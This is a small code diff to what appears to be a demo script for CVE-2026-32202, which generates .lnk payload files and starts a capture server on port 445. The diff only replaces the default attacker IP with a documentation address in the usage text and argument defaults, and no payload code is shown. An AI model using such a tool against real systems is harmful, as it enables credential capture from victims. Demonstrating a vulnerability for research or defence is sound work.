@@ -6,10 +6,10 @@ Generates .lnk files and optionally starts a capture server.
 
 Usage:
   # Generate payloads only
-  python quick_demo.py --attacker 192.168.1.100
+  python quick_demo.py --attacker 192.0.2.100
 
   # Generate + start capture server
-  python quick_demo.py --attacker 192.168.1.100 --capture
+  python quick_demo.py --attacker 192.0.2.100 --capture
 
   # Full walkthrough
   python quick_demo.py --explain
@@ -27,7 +27,7 @@ import threading
 
 def main():
     p = argparse.ArgumentParser(description="CVE-2026-32202 Quick Demo")
-    p.add_argument('--attacker', default='192.168.1.100')
+    p.add_argument('--attacker', default='192.0.2.100')
     p.add_argument('--port', type=int, default=445)
     p.add_argument('--capture', action='store_true', help='Start capture server')
     p.add_argument('--explain', action='store_true', help='Show full explanation')
